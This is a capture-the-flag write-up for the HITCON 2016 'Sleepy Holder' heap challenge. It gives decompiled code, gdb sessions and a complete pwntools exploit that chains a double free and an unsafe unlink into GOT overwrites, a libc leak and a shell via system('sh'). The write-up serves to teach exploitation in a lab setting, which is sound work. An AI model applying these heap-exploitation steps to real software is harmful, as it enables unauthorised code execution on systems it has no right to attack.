---
title: "Pwn-Sleepy Holder(300) - Solved by 1 Teams"
sidebar_position: 1
---


## **Information**

### **Description**
```
The Secret Holder has become sleepy and lazy now.  
nc 52.68.31.117 9547  
  
[SleepyHolder](https://s3-ap-northeast-1.amazonaws.com/hitcon2016qual/SleepyHolder_3d90c33bdbf3e5189febfa15b09ca5ee61b94015)  
[libc.so.6](https://s3-ap-northeast-1.amazonaws.com/hitcon2016qual/libc.so.6_375198810bb39e6593a968fcbcf6556789026743)
```
### **Files**

* [SleepyHolder\_3d90c33bdbf3e5189febfa15b09ca5ee61b94015](/attachments/7536654/7537079.bin)
* [libc.so.6\_375198810bb39e6593a968fcbcf6556789026743](/attachments/7536654/7537078.bin)

### **Source Code**

* [SleepyHolder.c](/attachments/7536654/7537080.c)

## **Write Up**

### File information

```sh title="File Information"
autolycos@ubuntu:~/CTF/HITCON2016/SleepyHolder$ file SleepyHolder_3d90c33bdbf3e5189febfa15b09ca5ee61b94015 
SleepyHolder_3d90c33bdbf3e5189febfa15b09ca5ee61b94015: ELF 64-bit LSB  executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=46f0e70abd9460828444d7f0975a8b2f2ddbad46, stripped
autolycos@ubuntu:~/CTF/HITCON2016/SleepyHolder$ checksec.sh --file SleepyHolder_3d90c33bdbf3e5189febfa15b09ca5ee61b94015 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   SleepyHolder_3d90c33bdbf3e5189febfa15b09ca5ee61b94015
autolycos@ubuntu:~/CTF/HITCON2016/SleepyHolder$
```

### Binary analysis

* **When you run this problem, the following menu is displayed.**
  + 1. Maintain confidentiality
  + 2. Clear secrets
  + 3.Secret update

```sh title="Menu" 
autolycos@ubuntu:~/CTF/HITCON2016/SleepyHolder$ ./SleepyHolder_3d90c33bdbf3e5189febfa15b09ca5ee61b94015 
Waking Sleepy Holder up ...
Hey! Do you have any secret?
I can help you to hold your secrets, and no one will be able to see it :)
1. Keep secret
2. Wipe secret
3. Renew secret
```

#### **Main**

* **The main() function function in question is as follows:**
  + Allocate the heap area using the value obtained by ANDing “4095” with the value read from the “/dev/urandom” file.
  + Prints the basic menu.

```c title="Main Function"
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  int command; // eax MAPDST
  unsigned int buf; // [rsp+4h] [rbp-1Ch]
  int fd; // [rsp+8h] [rbp-18h]
  char tmp; // [rsp+10h] [rbp-10h]
  unsigned __int64 v8; // [rsp+18h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  setSIGALM();
  puts("Waking Sleepy Holder up ...");
  fd = open("/dev/urandom", 0);
  read(fd, &buf, 4uLL);
  buf &= 4095u;
  malloc(buf);
  sleep(3u);
  puts("Hey! Do you have any secret?");
  puts("I can help you to hold your secrets, and no one will be able to see it :)");
  while ( 1 )
  {
    puts("1. Keep secret");
    puts("2. Wipe secret");
    puts("3. Renew secret");
    memset(&tmp, 0, 4uLL);
    read(0, &tmp, 4uLL);
    command = atoi(&tmp);
    switch ( command )
    {
      case 2:
        WipeSecret();
        break;
      case 3:
        RenewSecret();
        break;
      case 1:
        KeepSecret();
        break;
    }
  }
}
```

#### **KeepSecret**

* **The function has the following functions.**
  + You can create values ​​of three sizes using the calloc() function as follows.  
    - Small : 40 byte
    - Big : 4000 byte
    - Huge : 400000 byte
  + **The address of the allocated space is stored in a global variable.**
    - gSmallSecret
    - gBigSecret
    - gHugeSecret
  + **Saves memory area allocation status in global variable.**(set 1)****
    - gSmallSecretFlag
    - gBigSecretFlag
    - gHugeSecretFlag
  + Enter content into the allocated space using the read() function.

```c title="KeepSecret Function"
unsigned __int64 KeepSecret()
{
  int command; // eax
  char tmp; // [rsp+10h] [rbp-10h]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  puts("What secret do you want to keep?");
  puts("1. Small secret");
  puts("2. Big secret");
  if ( !gHugeSecretFlag )
    puts("3. Keep a huge secret and lock it forever");
  memset(&tmp, 0, 4uLL);
  read(0, &tmp, 4uLL);
  command = atoi(&tmp);
  if ( command == 2 )
  {
    if ( !gBigSecretFlag )
    {
      gBigSecret = calloc(1uLL, 0xFA0uLL);
      gBigSecretFlag = 1;
      puts("Tell me your secret: ");
      read(0, gBigSecret, 0xFA0uLL);
    }
  }
  else if ( command == 3 )
  {
    if ( !gHugeSecretFlag )
    {
      gHugeSecret = calloc(1uLL, 0x61A80uLL);
      gHugeSecretFlag = 1;
      puts("Tell me your secret: ");
      read(0, gHugeSecret, 0x61A80uLL);
    }
  }
  else if ( command == 1 && !gSmallSecretFlag )
  {
    gSmallSecret = calloc(1uLL, 0x28uLL);
    gSmallSecretFlag = 1;
    puts("Tell me your secret: ");
    read(0, gSmallSecret, 0x28uLL);
  }
  return __readfsqword(0x28u) ^ v3;
}
```

#### **WipeSecret**

* **The function has the following functions.**  
  + Delete the memory space created by the KeepSecret() function.
    - However, only Small and Big Secret spaces can be deleted.
    - Huge secrets cannot be deleted.
  + In other words, you can see that a Huge secret can only be created once.
  + Then, 0 is stored in the flag global variable of the freed size.
* **This is where the vulnerability comes in**
  + When freeing memory, values ​​stored in global variables are not initialized.
  + By repeating memory allocation and deallocation, **the same address can be stored in all global variables.**
* **This vulnerability causes other vulnerabilities**
  + Using the vulnerability described above, you can release the heap area without changing the value of the **flag global variable.**
  + This is the address value of the assigned heap that is passed to the free() function when freeing the heap area.

```c title="WipeSecret Function"
unsigned __int64 WipeSecret()
{
  int command; // eax
  char tmp; // [rsp+10h] [rbp-10h]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  puts("Which Secret do you want to wipe?");
  puts("1. Small secret");
  puts("2. Big secret");
  memset(&tmp, 0, 4uLL);
  read(0, &tmp, 4uLL);
  command = atoi(&tmp);
  if ( command == 1 )
  {
    free(gSmallSecret);
    gSmallSecretFlag = 0;
  }
  else if ( command == 2 )
  {
    free(gBigSecret);
    gBigSecretFlag = 0;
  }
  return __readfsqword(0x28u) ^ v3;
}
```

#### **RenewSecret**

* **The function has the following functions.**  
  + You can write content back to the memory space created by the KeepSecret() function.
  + Only the Small and Big Secret spaces can be changed.

```c title="RenewSecret Function"
__int64 RenewSecret()
{
  int command; // eax@1
  char input; // [rsp+10h] [rbp-10h]@1
  __int64 v3; // [rsp+18h] [rbp-8h]@1

  v3 = *MK_FP(__FS__, 40LL);
  puts("Which Secret do you want to renew?");
  puts("1. Small secret");
  puts("2. Big secret");
  memset(&input, 0, 4uLL);
  read(0, &input, 4uLL);
  command = atoi(&input);
  if ( command == 1 )
  {
    if ( gSmallSecretState )
    {
      puts("Tell me your secret: ");
      read(0, gSmallSecret, 0x28uLL);
    }
  }
  else if ( command == 2 && gBigSecMsgState )
  {
    puts("Tell me your secret: ");
    read(0, gBigSecMsg, 0xFA0uLL);
  }
  return *MK_FP(__FS__, 40LL) ^ v3;
}
```

### **Debuging**

#### **Heap Overflow**
* **Heap Overflow occurs in the following situations.**
  + "Keep secret" → "Small secret"
  + "Keep secret" → "Big secret"
  + "Wipe secret" → "Small secret"
  + "Keep secret" → "Huge secret"
  + "Wipe secret" → "Small secret"
* **We will check the cause through debugging.**

```sh title="Break point"
gdb-peda$ b *0x400000 + 0x9ff
Breakpoint 1 at 0x4009ff
gdb-peda$ b *0x400000 + 0xa5b
Breakpoint 2 at 0x400a5b
gdb-peda$ b *0x400000 + 0xab1
Breakpoint 3 at 0x400ab1
gdb-peda$ b *0x400000 + 0xb94
Breakpoint 4 at 0x400b94
gdb-peda$ b *0x400000 + 0xbaf
Breakpoint 5 at 0x400baf
gdb-peda$
```

* **The content below is the processing of the following input.**
  + "Keep secret" → "Small secret"
  + "Keep secret" → "Big secret"
  + "Wipe secret" → "Small secret"
* **Debugging allows you to check the following information:**
  + The address of the "gSmallSecret" global variable is 0x6020d0, and the allocated Heap address is 0x603bb0.
  + The address of the "gBigSecret" global variable is 0x6020c0, and the allocated heap address is 0x603be0.
  + The "Small secret" area was cleared with the "Wipe secret" → "Small secret" function, but the value stored in the global variable was not changed.

```sh title=""Wipe secret" → "Small secret""
gdb-peda$ r
Starting program: /home/lazenca0x0/CTF/HITCON/SleepyHolder/SleepyHolder_3d90c33bdbf3e5189febfa15b09ca5ee61b94015 
Waking Sleepy Holder up ...
Hey! Do you have any secret?
I can help you to hold your secrets, and no one will be able to see it :)
1. Keep secret
2. Wipe secret
3. Renew secret
1
What secret do you want to keep?
1. Small secret
2. Big secret
3. Keep a huge secret and lock it forever
1
Breakpoint 1, 0x00000000004009ff in ?? ()
gdb-peda$ x/i $rip
=> 0x4009ff:	mov    QWORD PTR [rip+0x2016ca],rax        # 0x6020d0
gdb-peda$ i r rax
rax            0x603bb0	0x603bb0
gdb-peda$ c
Continuing.

Program received signal SIGALRM, Alarm clock.
Tell me your secret: 
AAAA
1. Keep secret
2. Wipe secret
3. Renew secret
1
What secret do you want to keep?
1. Small secret
2. Big secret
3. Keep a huge secret and lock it forever
2
Breakpoint 2, 0x0000000000400a5b in ?? ()
gdb-peda$ x/i $rip
=> 0x400a5b:	mov    QWORD PTR [rip+0x20165e],rax        # 0x6020c0
gdb-peda$ i r rax
rax            0x603be0	0x603be0
gdb-peda$ c
Continuing.
Tell me your secret: 
BBBB
1. Keep secret
2. Wipe secret
3. Renew secret
2
Which Secret do you want to wipe?
1. Small secret
2. Big secret
1
Breakpoint 4, 0x0000000000400b94 in ?? ()
gdb-peda$ x/gx 0x6020d0
0x6020d0:	0x0000000000603bb0
gdb-peda$ x/gx 0x6020c0
0x6020c0:	0x0000000000603be0
gdb-peda$
```

* **The “Small secret” area released by calling the “Keep secret” → “Huge secret” function is registered in the “Small bin” area.**
  + Because the initially secured heap space is smaller than the size requested by the program, the malloc() function secures new heap space.
  + The malloc() function allocates a heap area of ​​the size requested by the program in the newly secured space.
  + And the "Small secret" area is registered in the "Small bin" area, and the address of the main\_arena area is stored in the fd and bk areas of the header of the corresponding heap.
    - fd : 0x00007ffff7dd1b98
    - bk : 0x00007ffff7dd1b98
* The address of the "gHugeSecret" global variable is 0x6020c8, and the allocated Heap address is 0x7ffff7f73010.

```sh title=""Keep secret" → "Huge secret"""
gdb-peda$ c
Continuing.
1. Keep secret
2. Wipe secret
3. Renew secret
1
What secret do you want to keep?
1. Small secret
2. Big secret
3. Keep a huge secret and lock it forever
3

Breakpoint 3, 0x0000000000400ab1 in ?? ()
gdb-peda$ x/i $rip
=> 0x400ab1:	mov    QWORD PTR [rip+0x201610],rax        # 0x6020c8
gdb-peda$ i r rax
rax            0x7ffff7f73010	0x7ffff7f73010
gdb-peda$ p main_arena.system_mem 
$1 = 0x21000
gdb-peda$ p main_arena.max_system_mem 
$2 = 0x21000
gdb-peda$ p main_arena.bins[4]
$3 = (mchunkptr) 0x603ba0
gdb-peda$ p main_arena.bins[5]
$4 = (mchunkptr) 0x603ba0
gdb-peda$ x/4gx 0x603ba0
0x603ba0:	0x0000000000000000	0x0000000000000031
0x603bb0:	0x00007ffff7dd1b98	0x00007ffff7dd1b98
gdb-peda$
```

* **An “Unsafe unlink” attack can be performed in the following way.**
  + For "Unsafe unlink" attacks, the PREV\_INUSE value must be removed from the size area of ​​the Allocated chunk.
    - However, the area cannot be overflowed. Double free the "Small secret" space and remove the PREV\_INUSE value.
    - When you call the "Wipe secret" → "Small secret" function, the released "Small secret" space is freed (Double free) and registered in fastbin.
  + By calling the "Keep secret" → "Small secret" function, the released "Small secret" area is reallocated without adding the PREV\_INUSE value to the size value of the chunk used by "Big secret".
    - Addresses registered in fastbin are removed, but addresses registered in smallbin are not removed.
  + Save the Fake chunk in the “Small secret” area through input.

```sh title="Remove \"prev_size\""
gdb-peda$ p main_arena.bins[4]
$5 = (mchunkptr) 0x603ba0
gdb-peda$ p main_arena.bins[5]
$6 = (mchunkptr) 0x603ba0
gdb-peda$ p main_arena.fastbinsY 
$7 = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}
gdb-peda$ c
Continuing.

Tell me your secret: 
CCCC
1. Keep secret
2. Wipe secret
3. Renew secret
2
Which Secret do you want to wipe?
1. Small secret
2. Big secret
1

Breakpoint 4, 0x0000000000400b94 in ?? ()
gdb-peda$ p main_arena.bins[4]
$8 = (mchunkptr) 0x603ba0
gdb-peda$ p main_arena.bins[5]
$9 = (mchunkptr) 0x603ba0
gdb-peda$ p main_arena.fastbinsY 
$10 = {0x0, 0x603ba0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}
gdb-peda$ c
Continuing.
1. Keep secret
2. Wipe secret
3. Renew secret
1
What secret do you want to keep?
1. Small secret
2. Big secret
1

Breakpoint 1, 0x00000000004009ff in ?? ()
gdb-peda$ p main_arena.bins[4]
$11 = (mchunkptr) 0x603ba0
gdb-peda$ p main_arena.bins[5]
$12 = (mchunkptr) 0x603ba0
gdb-peda$ p main_arena.fastbinsY 
$13 = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}
gdb-peda$ x/6gx 0x603bb0
0x603bb0:	0x0000000000000000	0x0000000000000000
0x603bc0:	0x0000000000000000	0x0000000000000000
0x603bd0:	0x0000000000000000	0x0000000000000fb0
gdb-peda$
```

* **Save the Fake chunk as follows.**
  + You can save the prev\_size value of Fake chunk and Allocated chunk through user input value.

```sh title="Unsafe unlink"
gdb-peda$ c
Continuing.
Tell me your secret: 
AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEE
1. Keep secret
2. Wipe secret
3. Renew secret
1. Keep secret
2. Wipe secret
3. Renew secret
^C
Program received signal SIGINT, Interrupt.

0x00007ffff7b04230 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
gdb-peda$ x/6gx 0x603bb0
0x603bb0:	0x4141414141414141	0x4242424242424242
0x603bc0:	0x4343434343434343	0x4444444444444444
0x603bd0:	0x4545454545454545	0x0000000000000fb0
gdb-peda$ set *0x603bb0 = 0x0
gdb-peda$ set *0x603bb4 = 0x0
gdb-peda$ set *0x603bb8 = 0x0
gdb-peda$ set *0x603bbc = 0x0
gdb-peda$ set *0x603bc0 = 0x6020d0 - 0x18
gdb-peda$ set *0x603bc4 = 0x0
gdb-peda$ set *0x603bc8 = 0x6020d0 - 0x10
gdb-peda$ set *0x603bcc = 0x0
gdb-peda$ set *0x603bd0 = 0x20
gdb-peda$ set *0x603bd4 = 0x0
gdb-peda$ x/6gx 0x603bb0
0x603bb0:	0x0000000000000000	0x0000000000000000
0x603bc0:	0x00000000006020b8	0x00000000006020c0
0x603bd0:	0x0000000000000020	0x0000000000000fb0
gdb-peda$ x/gx 0x6020d0
0x6020d0:	0x0000000000603bb0
gdb-peda$
```

* **The Fake chunk structure is as follows:**

:::note[Fake chunk]
| addresss | 0x0 | 0x8 |
| --- | --- | --- |
| 0x603bb0 | 0x0 | 0x0 |
| 0x603bc0 | fb(0x6020d0 - 0x18) | bk(0x6020d0 - 0x10) |
| 0x603bd0 | prev\_size(0x20) | size(0xfb0) |
:::

* **By the "Unsafe unlink" technique, the address value of the ".bss" area (**0x6020d0 - 0x18) is stored in the global variable "gSmallSecret" (0x6020d0).**

```sh title="The value of the "gSmallSecret" area has changed."
gdb-peda$ c
Continuing.
2
Which Secret do you want to wipe?
1. Small secret
2. Big secret
2

Breakpoint 5, 0x0000000000400baf in ?? ()
gdb-peda$ x/gx 0x6020d0
0x6020d0:	0x00000000006020b8
gdb-peda$
```

:::note[Detailed explanation of the Unsafe unlink]
* [unsafe unlink](https://www.lazenca.net/display/TEC/unsafe+unlink)
:::

### Structure of Exploit code

* The order of payload is as follows:

:::note[Payload order]
1. Unsafe unlink (global variable)
2. Leak Heap Addresss
3. offset extraction
4. Overflow(system)
:::

* This is explained in more detail as follows.

:::note[Detailed description]
1. Unsafe unlink (global variable)
   1. Change the address value of the “gSmallSecret” global variable
2. Leak Heap Addresss
   1. Change the address value of the ""gBigSecret"" variable to the .got.plt address value.
   2. Save the value of the .got.plt "\_free" area to the address of .plt \_puts
   3. "WipeSecret" → "BigSecret"
3. offset extraction
   1. System()
4. Overflow(system)
   1. .got.plt Stores the value in the "\_free" area as the \_\_libc\_system address value.
   2. "Keep secret" → "BigSecret"
   3. "WipeSecret" → "BigSecret"
:::  

* The information you need to find out for an attack based on the payload is as follows.

:::note[List of information to check]
* Leak libc addresss
:::

### **Information for attack**

#### **Leak libc addresss**

* **The libc addresses needed for the attack can be obtained in the following way.**
  + 0x6020b8 (.bss area) was stored in the "gSmallSecret" variable using an unsafe unlink vulnerability.
  + An attacker can use the "gSmallSecret" variable to change the values ​​stored in global variables.
  - Global variables use the area 0x6020C0 ~ 0x6020E0
* **You can change the values ​​of global variables by selecting “Small secret” using the “Renew secret” function.**
  + Using this vulnerability, you can change the values ​​of got and plt to extract the required address value and execute the shell.

```sh title="Overwrite to global variable"
gdb-peda$ b *0x400C86
gdb-peda$ c
Continuing.
3
Which Secret do you want to renew?
1. Small secret
2. Big secret
1
Tell me your secret:
AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEE

Breakpoint 5, 0x0000000000400c86 in ?? ()
gdb-peda$ x/6gx 0x00000000006020b8
0x6020b8:	0x4141414141414141	0x4242424242424242
0x6020c8:	0x4343434343434343	0x4444444444444444
0x6020d8:	0x4545454545454545	0x0000000000000001
gdb-peda$
```

* **You can extract libc addresses from which you can calculate the base address in the following way.**
  + To extract the address value, the got area of ​​the free() function is targeted for attack.
  + You can change the value of the global variable as follows using the “Renew secret” → “Small secret” function.
    - gBigSecret [0x6020c0] : got address of atoi() function
    - gHugeSecret [0x6020c8] : got address of puts() function
    - gSmallSecret [0x6020d0]: got address of free() function
  + You can change the value of the got area of ​​the free() function using the “Renew secret” → “Small secret” function.
    - Change the plt value of the free() function to the plt address of the puts() function.
  + If you request deletion of the "Big secret" using the "Wipe secret" function, the puts() function is called by the changed got of the free() function.
    - Since "Big secret" is selected, the got address of the atoi() function stored in "gBigSecret" is displayed.

### **Exploit Code**

```python title="Exploit Code"
from pwn import *
#context.log_level = 'debug'

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def KeepSecret(size,content):
    p.recvuntil('3. Renew secret\n')
    p.sendline('1')
    p.recvuntil('2. Big secret\n')
    p.sendline(str(size));
    p.recvuntil('Tell me your secret: ')
    p.send(content)

def WipeSecret(size):
    p.recvuntil('3. Renew secret\n')
    p.sendline('2')
    p.recvuntil('2. Big secret\n')
    p.sendline(str(size))

def RenewSecret(size,content):
    p.recvuntil('3. Renew secret\n')
    p.sendline('3')
    p.recvuntil('2. Big secret\n')
    p.sendline(str(size))
    p.recvuntil('Tell me your secret: ')
    p.send(content)

gSmallSecret = 0x6020D0

p = process('SleepyHolder_3d90c33bdbf3e5189febfa15b09ca5ee61b94015')
bin = ELF('SleepyHolder_3d90c33bdbf3e5189febfa15b09ca5ee61b94015')

#Remove "prev_size"
KeepSecret(1,'AAAA')
KeepSecret(2,'BBBB')
WipeSecret(1)
KeepSecret(3,'CCCC')
WipeSecret(1)

#Unsafe unlink
secret = p64(0) 
secret += p64(0) 
secret += p64(gSmallSecret - 0x18)
secret += p64(gSmallSecret - 0x10)
secret += p64(0x20)
KeepSecret(1,secret)
WipeSecret(2)

#Overwrite to global variable
secret = p64(0)					#[0x6020b8]
secret += p64(bin.got['atoi'])	#gBigSecret[0x6020c0]
secret += p64(bin.got['puts'])  #gHugeSecret[0x6020c8]
secret += p64(bin.got['free'])  #gSmallSecret[0x6020d0]
secret += p64(1) * 3			#gBigSecretFlag[0x6020d8],gHugeSecretFlag[0x6020dc],gSmallSecretFlag[0x6020e0],...
RenewSecret(1,secret)

#Leak libc
RenewSecret(1,p64(bin.plt['puts']))				#bin.got['free']:bin.plt['free'] -> bin.plt['puts']
WipeSecret(2)									#puts(atoi() got)
libcAddr = u64(p.recv(6).ljust(8,'\x00'))
libc.addresss += libcAddr - libc.symbols['atoi']
systemAddr = libc.symbols['system']

log.info("Libc Addresss : " + hex(libc.addresss))
log.info("System : " + hex(systemAddr))

#Overwrite
RenewSecret(1,p64(systemAddr))					#bin.got['free']:bin.plt['puts'] -> addresss of system()
KeepSecret(2,'sh\0')							#save 'sh'character in the Bigsecret area
WipeSecret(2)									#system('sh')

p.interactive()
```

```c title="SYNOPSIS"
#include <stdlib.h> 
int system(const char *command);
```

## **Flag**

|  |  |
| --- | --- |
| Flag | flag is: hitcon&#123;The Huuuuuuuuuuuge Secret Really MALLOC a difference!&#125; |

## **Related Site**

* <https://github.com/mehQQ/public_writeup/tree/master/hitcon2016/SleepyHolder>